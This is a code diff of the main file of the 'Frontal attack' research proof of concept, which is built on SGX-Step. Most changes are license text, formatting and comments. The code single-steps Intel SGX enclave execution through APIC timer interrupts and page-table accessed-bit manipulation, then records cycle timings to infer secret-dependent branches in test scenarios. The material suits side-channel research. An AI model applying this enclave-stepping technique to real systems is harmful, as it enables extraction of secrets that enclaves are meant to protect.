@@ -1,24 +1,31 @@
 /*
- *  This file is part of the SGX-Step enclave execution control framework.
+ *  This file is part of the Frontal attack PoC.
  *
- *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
- *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
+ *  Copyright (C) 2020 Ivan Puddu <ivan.puddu@inf.ethz.ch>,
+ *                     Moritz Schneider <moritz.schneider@inf.ethz.ch>,
+ *                     Miro Haller <miro.haller@alumni.ethz.ch>
  *
- *  SGX-Step is free software: you can redistribute it and/or modify
- *  it under the terms of the GNU General Public License as published by
- *  the Free Software Foundation, either version 3 of the License, or
- *  (at your option) any later version.
+ *  The Frontal attack PoC is free software: you can redistribute it
+ *  and/or modify it under the terms of the GNU General Public License
+ *  as published by the Free Software Foundation, either version 3 of
+ *  the License, or (at your option) any later version.
  *
- *  SGX-Step is distributed in the hope that it will be useful,
- *  but WITHOUT ANY WARRANTY; without even the implied warranty of
- *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
- *  GNU General Public License for more details.
+ *  The Frontal attack PoC is distributed in the hope that it will
+ *  be useful, but WITHOUT ANY WARRANTY; without even the implied
+ *  warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ *  See the GNU General Public License for more details.
  *
  *  You should have received a copy of the GNU General Public License
- *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
+ *  along with the Frontal attack PoC.
+ *  If not, see <http://www.gnu.org/licenses/>.
  */
 
-/* Modified by Ivan Puddu <ivan.puddu@inf.ethz.ch> on 20.02.2020 */
+/*
+ * This attack uses the general structure of the SGX-Step benchmarking
+ * application from Jo Van Bulck and Raoul Strackx. Moreover, we adapted
+ * part of this structure to improve the measurements.
+ */
+
 
 /* Note that this define is required for syscalls to work. */
 #define _GNU_SOURCE 1
@@ -86,11 +93,8 @@ char * event_desc[NUM_PCMS];
 #endif
 
 sgx_enclave_id_t eid = 0;
-int strlen_nb_access = 0;
 int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
 uint64_t *pte_encl = NULL;
-uint64_t *pte_str_encl = NULL;
-uint64_t *pmd_encl = NULL;
 uint64_t base_sgx_step_counter = SGX_STEP_TIMER_INTERVAL;
 idt_t idt = {0};
 uint8_t encl_env_clean = 0;
@@ -102,12 +106,11 @@ uint8_t do_cnt_instr_old = 0;
 typedef struct measurement_t
 {
     uint64_t cycles;
-    // uint32_t page_nr;
     uint8_t accessed;
     uint8_t do_count;
-#if PCM_ENABLED
+    #if PCM_ENABLED
     uint64_t pcms[NUM_PCMS];
-#endif
+    #endif
 } measurement_t;
 measurement_t *log_arr;
 size_t log_arr_size;
@@ -134,9 +137,9 @@ uint64_t aep_cb_func(void) {
     #endif
 
     #if EDBGRD
-        uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();
-        info("^^ enclave RIP=%#llx; ACCESSED=%d; do_cnt_instr=%d; irq_cnt=%d; ", erip, ACCESSED(*pte_encl), *do_cnt_instr, irq_cnt);
-    #endif 
+    uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();
+    info("^^ enclave RIP=%#llx; ACCESSED=%d; do_cnt_instr=%d; irq_cnt=%d; ", erip, ACCESSED(*pte_encl), *do_cnt_instr, irq_cnt);
+    #endif
 
     irq_cnt++;
 
@@ -176,7 +179,7 @@ uint64_t aep_cb_func(void) {
      * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
      * ERESUME such that the interrupt reliably arrives in the first subsequent
      * enclave instruction.
-     * 
+     *
      */
     if (__builtin_expect(do_irq, 1))
     {
@@ -186,7 +189,6 @@ uint64_t aep_cb_func(void) {
         * to filter out "zero-step" results that won't set the accessed bit.
         */
         *pte_encl = MARK_NOT_ACCESSED(*pte_encl);
-        //*pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
 
         __asm__ __volatile__(
             "prefetcht0 sgx_step_aep_trampoline(%%rip)\n\t"
@@ -202,6 +204,7 @@ uint64_t aep_cb_func(void) {
             :::
         );
 
+        // The value returned by this function will be set as the APIC counter
         return base_sgx_step_counter;
     }
     return 0;
@@ -225,7 +228,8 @@ int irq_count = 0;
 void irq_handler(uint8_t *rsp)
 {
     uint64_t *p = (uint64_t *)rsp;
-#if DBIRQ
+
+    #if DBIRQ
     printf("\n");
     info("****** hello world from user space IRQ handler with count=%d ******",
         irq_count++);
@@ -235,7 +239,7 @@ void irq_handler(uint8_t *rsp)
     info("RIP is %p", *p++);
     info("CS is %p", *p++);
     info("EFLAGS is %p", *p++);
-#endif
+    #endif
 }
 
 /* ================== ATTACKER INIT/SETUP ================= */
@@ -258,13 +262,13 @@ void attacker_config_runtime(void)
     register_aep_cb(aep_cb_func);
     register_enclave_info();
 
-    #if PCM_ENABLED 
-        // This is necessary otherwise the performance counters are not recorded
-        set_tcs_dbflag(1);
-        // Note: setting the DEBUG flag makes EENTRY and EAX faster, so we need
-        // to adjust the base SGX_STEP counter accordingly
-        base_sgx_step_counter -= (APIC_TDR_DIV_SET == APIC_TDR_DIV_1) ? 2 : 1;
-        ASSERT( base_sgx_step_counter );
+    #if PCM_ENABLED
+    // This is necessary otherwise the performance counters are not recorded
+    set_tcs_dbflag(1);
+    // Note: setting the DEBUG flag makes EENTRY and EAX faster, so we need
+    // to adjust the base SGX_STEP counter accordingly
+    base_sgx_step_counter -= (APIC_TDR_DIV_SET == APIC_TDR_DIV_1) ? 2 : 1;
+    ASSERT( base_sgx_step_counter );
     #endif
 
     print_enclave_info();
@@ -274,22 +278,21 @@ void attacker_config_runtime(void)
 void attacker_config_page_table(void)
 {
     void *code_adrs;
-    
+
     #if (ATTACK_SCENARIO == MICROBENCH)
-        SGX_ASSERT(get_asm_secret_branch_adrs(eid, &code_adrs));
+    SGX_ASSERT(get_asm_secret_branch_adrs(eid, &code_adrs));
     #elif (ATTACK_SCENARIO == IPP_LIB)
-        SGX_ASSERT(get_asm_ipp_adrs(eid, &code_adrs));
+    SGX_ASSERT(get_asm_ipp_adrs(eid, &code_adrs));
     #endif
 
     //print_page_table( code_adrs );
     info("enclave trigger code adrs at %p\n", code_adrs);
     ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
-#if SINGLE_STEP_ENABLE
+    #if SINGLE_STEP_ENABLE
     *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
-#endif
+    #endif
 
     //print_page_table( get_enclave_base() );
-    ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
 }
 
 /* ================== Helper functions ================= */
@@ -346,7 +349,7 @@ int perf_counter_init(int argc, const char **argv) {
 #endif
 
 int log_timing_results(uint8_t *secret_arr, int secret_size) {
-    const char* fname = "./logs/measurements.txt"; 
+    const char* fname = "./logs/measurements.txt";
     const char* sname = "./logs/secrets.txt";
     int i, pcms_print_inx;
     FILE *sf = fopen(sname, "w");
@@ -355,28 +358,33 @@ int log_timing_results(uint8_t *secret_arr, int secret_size) {
     FILE *fp = fopen(fname, "w");
     fprintf(fp, "Test name: secret_branch\n");
     fprintf(fp, "All instructions timing. Scenario: %d.", ATTACK_SCENARIO);
+
     #if PCM_ENABLED
-        fprintf(fp, " (events:");
-        for (i = 0; i < NUM_PCMS; i++) {
-            fprintf(fp, " %s", event_desc[i]);
-        }
-        fprintf(fp, ")");
+    fprintf(fp, " (events:");
+    for (i = 0; i < NUM_PCMS; i++) {
+        fprintf(fp, " %s", event_desc[i]);
+    }
+    fprintf(fp, ")");
     #endif
+
     fprintf(fp, "\n", NUM_RUNS);
     fprintf(fp, "cycles, secret");
+
     #if (ATTACK_SCENARIO == IPP_LIB)
-        fprintf(fp, "b1, secretb2");
+    fprintf(fp, "b1, secretb2");
     #endif
+
     #if PCM_ENABLED
-        for (i = 0; i < NUM_PCMS; i++) {
-            fprintf(fp, ", %s", event_desc[i]);
-        }
+    for (i = 0; i < NUM_PCMS; i++) {
+        fprintf(fp, ", %s", event_desc[i]);
+    }
     #endif
     fprintf(fp, "\n");
 
-    int abnormarl = 0;
+    int abnormal = 0;
     int old_cnt = 0;
     int secret_inx = 0;
+
     //TODO: Unify logging for the two test cases so it's easier to read
     #if (ATTACK_SCENARIO == MICROBENCH)
     int num_per_run = 0;
@@ -384,7 +392,7 @@ int log_timing_results(uint8_t *secret_arr, int secret_size) {
         if (log_arr[i].do_count == 0) {
             fprintf(fp, "-\n");
             if (num_per_run != 1 + NUM_INSTR * 2 + (1 - secret_arr[secret_inx]) ) {
-                abnormarl++;
+                abnormal++;
             }
             secret_inx++;
             num_per_run = 0;
@@ -419,22 +427,22 @@ int log_timing_results(uint8_t *secret_arr, int secret_size) {
         // increment secret
         old_cnt = log_arr[i].do_count;
     }
-    #endif 
+    #endif
 
     info("saving random secrets used to %s:", sname);
     for (i = 0; i < secret_size; i++) {
         fprintf(sf, "%d\n", secret_arr[i]);
     }
-    
+
     fclose(sf);
     fclose(fp);
     free(log_arr);
     free(do_cnt_instr);
     free(secret_arr);
 
-    if (!abnormarl) return 0;
+    if (!abnormal) return 0;
 
-    error("Detected %d abnormal runs.. Try to tweak the SGX_STEP_TIMER_INTERVAL value. (Currently it's probably too high)\n", abnormarl);
+    error("Detected %d  runs.. Try to tweak the SGX_STEP_TIMER_INTERVAL value. (Currently it's probably too high)\n", abnormal);
     return -1;
 }
 
@@ -447,14 +455,14 @@ void __attribute__((destructor)) cleanup() {
     }
 
     #if USER_IDT_ENABLE
-        remove_custom_irq_handler(&idt, IRQ_VECTOR);
+    remove_custom_irq_handler(&idt, IRQ_VECTOR);
     #endif
 
     #if PCM_ENABLED
-        for(int free_inx = 0; free_inx < NUM_PCMS; free_inx++) {
-            free((void *)event_desc[free_inx]);
-        }
-        pcm_c_clean();
+    for(int free_inx = 0; free_inx < NUM_PCMS; free_inx++) {
+        free((void *)event_desc[free_inx]);
+    }
+    pcm_c_clean();
     #endif
 }
 
@@ -467,7 +475,7 @@ int main(int argc, const char **argv)
     int apic_fd, encl_strlen = 0, updated = 0;
 
     #if PCM_ENABLED
-        if (perf_counter_init(argc, argv)) return -1;
+    if (perf_counter_init(argc, argv)) return -1;
     #endif
 
     info_event("Creating enclave...");
@@ -478,26 +486,28 @@ int main(int argc, const char **argv)
     attacker_config_runtime();
     attacker_config_page_table();
 
-#if USER_IDT_ENABLE
+    #if USER_IDT_ENABLE
     info_event("Establishing user space APIC/IDT mappings");
     map_idt(&idt);
     install_user_irq_handler(&idt, irq_handler, IRQ_VECTOR);
     //dump_idt(&idt);
     apic_timer_oneshot(IRQ_VECTOR);
-#else
+    #else
     info_event("Establishing user space APIC mapping (with kernel space handler)");
     apic_timer_oneshot(LOCAL_TIMER_VECTOR);
-#endif
+    #endif
 
-/* TODO for some reason the Dell Latitude machine first needs 2 SW IRQs
-     * before the timer IRQs even fire (??) */
-#if USER_IDT_ENABLE
+    /*
+     * TODO for some reason the Dell Latitude machine first needs 2 SW IRQs
+     * before the timer IRQs even fire (??)
+     */
+    #if USER_IDT_ENABLE
     info_event("Triggering user space software interrupts");
     asm("int %0\n\t" ::"i"(IRQ_VECTOR)
         :);
     asm("int %0\n\t" ::"i"(IRQ_VECTOR)
         :);
-#endif
+    #endif
 
     info("generating random secret");
     int secret_arr_size;
@@ -505,7 +515,7 @@ int main(int argc, const char **argv)
     int max_rand_val = 2;
 
     #if ATTACK_SCENARIO == IPP_LIB
-        max_rand_val = 3;
+    max_rand_val = 3;
     #endif
 
     secret_arr_size = NUM_RUNS;
@@ -520,11 +530,11 @@ int main(int argc, const char **argv)
 
     info("initialize log array");
     #if (ATTACK_SCENARIO == MICROBENCH)
-        log_arr_size = NUM_RUNS * (NUM_INSTR * 2 + 3);
+    log_arr_size = NUM_RUNS * (NUM_INSTR * 2 + 3);
     #elif (ATTACK_SCENARIO == IPP_LIB)
-        // Note: THe log array should be big enough otherwise it will trigger a segmentation fault
-        // while measuring
-        log_arr_size = NUM_RUNS * (BIN_NUM_LEN * 6 + 14); 
+    // Note: THe log array should be big enough otherwise it will trigger
+    // a segmentation fault while measuring
+    log_arr_size = NUM_RUNS * (BIN_NUM_LEN * 6 + 14);
     #endif
     ASSERT(log_arr = (measurement_t *)calloc(log_arr_size, sizeof(measurement_t)));
 
@@ -541,9 +551,9 @@ int main(int argc, const char **argv)
 
 
     #if (ATTACK_SCENARIO  == MICROBENCH)
-        SGX_ASSERT(do_asm_secret_branch(eid, do_cnt_instr, secret_arr, secret_arr_size));
+    SGX_ASSERT(do_asm_secret_branch(eid, do_cnt_instr, secret_arr, secret_arr_size));
     #elif (ATTACK_SCENARIO == IPP_LIB)
-        SGX_ASSERT(do_asm_ipp(eid, do_cnt_instr, secret_arr, secret_arr_size, BIN_NUM_LEN));
+    SGX_ASSERT(do_asm_ipp(eid, do_cnt_instr, secret_arr, secret_arr_size, BIN_NUM_LEN));
     #endif
 
     /* 3. Restore normal execution environment. */
